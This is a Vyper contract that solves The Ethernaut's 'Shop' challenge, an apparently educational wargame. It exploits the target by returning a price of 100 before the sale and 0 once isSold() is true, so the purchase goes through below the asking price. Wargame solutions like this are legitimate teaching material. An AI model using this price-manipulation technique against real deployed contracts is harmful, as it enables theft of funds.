# pragma version 0.4.0
"""
@title A hack for level 21 (Shop) of The Ethernaut
@license MIT
@author unluckyduke7
"""

interface Shop:
	def buy(): nonpayable
	def isSold() -> bool: view


@external
def hack(instance: Shop):
	extcall instance.buy()


@view
@external
def price() -> uint256:
	if staticcall Shop(msg.sender).isSold():
		return 0
	return 100
